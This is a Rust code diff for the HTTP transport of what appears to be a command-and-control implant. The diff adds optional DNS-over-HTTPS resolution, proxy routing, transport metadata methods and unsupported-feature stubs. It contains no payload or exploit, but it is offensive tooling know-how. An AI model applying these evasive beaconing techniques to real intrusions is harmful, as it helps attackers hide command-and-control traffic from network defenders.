@@ -3,9 +3,18 @@ use anyhow::{Context, Result};
 use bytes::BytesMut;
 use hyper::body::HttpBody;
 use hyper::StatusCode;
-use pb::c2::*;
+use pb::{c2::*, config::Config};
 use prost::Message;
-use std::sync::mpsc::{Receiver, Sender};
+use std::sync::{
+    mpsc::{Receiver, Sender},
+    Arc,
+};
+
+#[cfg(feature = "doh")]
+use crate::dns_resolver::doh::{DohProvider, HickoryResolverService};
+
+use hyper::Uri;
+use std::str::FromStr;
 
 /// gRPC frame header utilities for encoding/decoding wire protocol frames
 mod grpc_frame {
@@ -101,10 +110,51 @@ where
     pb::xchacha::decode_with_chacha::<Req, Resp>(data)
 }
 
-#[derive(Debug, Clone)]
+/// Trait for making HTTP requests, abstracting over different connector types
+trait HttpClient: Send + Sync {
+    fn request(
+        &self,
+        req: hyper::Request<hyper::Body>,
+    ) -> std::pin::Pin<
+        Box<
+            dyn std::future::Future<Output = Result<hyper::Response<hyper::Body>, hyper::Error>>
+                + Send
+                + '_,
+        >,
+    >;
+}
+
+impl<C> HttpClient for hyper::Client<C>
+where
+    C: hyper::client::connect::Connect + Clone + Send + Sync + 'static,
+{
+    fn request(
+        &self,
+        req: hyper::Request<hyper::Body>,
+    ) -> std::pin::Pin<
+        Box<
+            dyn std::future::Future<Output = Result<hyper::Response<hyper::Body>, hyper::Error>>
+                + Send
+                + '_,
+        >,
+    > {
+        Box::pin(self.request(req))
+    }
+}
+
+#[allow(clippy::upper_case_acronyms)]
+#[derive(Clone)]
 pub struct HTTP {
-    client: hyper::Client<hyper::client::HttpConnector>,
+    client: Arc<dyn HttpClient>,
     base_url: String,
+}
+
+impl std::fmt::Debug for HTTP {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        f.debug_struct("HTTP")
+            .field("base_url", &self.base_url)
+            .finish_non_exhaustive()
+    }
 }
 
 impl HTTP {
@@ -131,7 +181,7 @@ impl HTTP {
             .client
             .request(req)
             .await
-            .context("Failed to send HTTP request")?;
+            .map_err(|e| anyhow::anyhow!("HTTP request failed: {}", e))?;
 
         if response.status() != StatusCode::OK {
             return Err(anyhow::anyhow!("HTTP error: {}", response.status()));
@@ -303,19 +353,62 @@ impl Transport for HTTP {
         connector.set_nodelay(true);
         let client = hyper::Client::builder().build(connector);
         HTTP {
-            client,
+            client: Arc::new(client),
             base_url: String::new(),
         }
     }
 
-    fn new(callback: String, _proxy_uri: Option<String>) -> Result<Self> {
-        // Create HTTP connector
-        let mut connector = hyper::client::HttpConnector::new();
-        connector.enforce_http(false); // Allow HTTPS
-        connector.set_nodelay(true); // TCP optimization
+    fn new(config: Config) -> Result<Self> {
+        // Extract URI and EXTRA from config using helper functions
+        let callback = crate::transport::extract_uri_from_config(&config)?;
+        let extra_map = crate::transport::extract_extra_from_config(&config);
 
-        // Build HTTP client
-        let client = hyper::Client::builder().build(connector);
+        #[cfg(feature = "doh")]
+        let doh: Option<&String> = extra_map.get("doh");
+
+        // Create base HTTP connector (either DOH-enabled or system DNS)
+        #[cfg(feature = "doh")]
+        let mut http = match doh {
+            // TODO: Add provider selection based on the provider string
+            Some(_provider) => {
+                crate::dns_resolver::doh::create_doh_connector(DohProvider::Cloudflare)?
+            }
+            None => {
+                // Use system DNS when DOH not explicitly requested
+                crate::dns_resolver::doh::create_doh_connector(DohProvider::System)?
+            }
+        };
+
+        #[cfg(not(feature = "doh"))]
+        let mut http = hyper::client::HttpConnector::new();
+
+        // Get proxy configuration from extra field
+        let proxy_uri = extra_map.get("http_proxy");
+
+        // Configure connector
+        http.enforce_http(false); // Allow HTTPS
+        http.set_nodelay(true); // TCP optimization
+
+        // Build the appropriate client based on configuration
+        let client: Arc<dyn HttpClient> = match proxy_uri {
+            Some(proxy_uri_string) => {
+                // Create proxy connector
+                let proxy = hyper_proxy::Proxy::new(
+                    hyper_proxy::Intercept::All,
+                    Uri::from_str(proxy_uri_string.as_str())?,
+                );
+                let mut proxy_connector = hyper_proxy::ProxyConnector::from_proxy(http, proxy)?;
+                proxy_connector.set_tls(None);
+
+                // Build client with proxy
+                Arc::new(hyper::Client::builder().build(proxy_connector))
+            }
+            #[allow(non_snake_case) /* None is a reserved keyword */]
+            None => {
+                // No proxy configuration
+                Arc::new(hyper::Client::builder().build(http))
+            }
+        };
 
         Ok(Self {
             client,
@@ -419,6 +512,32 @@ impl Transport for HTTP {
         Err(anyhow::anyhow!(
             "http/1.1 transport does not support reverse shell"
         ))
+    }
+
+    async fn create_portal(
+        &mut self,
+        _rx: tokio::sync::mpsc::Receiver<CreatePortalRequest>,
+        _tx: tokio::sync::mpsc::Sender<CreatePortalResponse>,
+    ) -> Result<()> {
+        Err(anyhow::anyhow!(
+            "http/1.1 transport does not support portal"
+        ))
+    }
+
+    fn get_type(&mut self) -> pb::c2::transport::Type {
+        return pb::c2::transport::Type::TransportHttp1;
+    }
+
+    fn is_active(&self) -> bool {
+        !self.base_url.is_empty()
+    }
+
+    fn name(&self) -> &'static str {
+        "http"
+    }
+
+    fn list_available(&self) -> Vec<String> {
+        vec!["http".to_string()]
     }
 }
 
@@ -594,7 +713,7 @@ mod tests {
         #[test]
         fn test_build_uri_success() {
             let http = HTTP {
-                client: hyper::Client::new(),
+                client: Arc::new(hyper::Client::new()),
                 base_url: "http://localhost:8080".to_string(),
             };
 
@@ -605,7 +724,7 @@ mod tests {
         #[test]
         fn test_build_uri_with_trailing_slash() {
             let http = HTTP {
-                client: hyper::Client::new(),
+                client: Arc::new(hyper::Client::new()),
                 base_url: "http://localhost:8080/".to_string(),
             };
 
@@ -616,7 +735,7 @@ mod tests {
         #[test]
         fn test_build_uri_without_leading_slash() {
             let http = HTTP {
-                client: hyper::Client::new(),
+                client: Arc::new(hyper::Client::new()),
                 base_url: "http://localhost:8080".to_string(),
             };
 
@@ -627,7 +746,7 @@ mod tests {
         #[test]
         fn test_build_uri_invalid() {
             let http = HTTP {
-                client: hyper::Client::new(),
+                client: Arc::new(hyper::Client::new()),
                 base_url: "not a valid url".to_string(),
             };
 
@@ -638,7 +757,7 @@ mod tests {
         #[test]
         fn test_request_builder_headers_and_method() {
             let http = HTTP {
-                client: hyper::Client::new(),
+                client: Arc::new(hyper::Client::new()),
                 base_url: "http://localhost".to_string(),
             };
 
@@ -658,7 +777,7 @@ mod tests {
         #[test]
         fn test_request_builder_uri() {
             let http = HTTP {
-                client: hyper::Client::new(),
+                client: Arc::new(hyper::Client::new()),
                 base_url: "http://example.com".to_string(),
             };
 
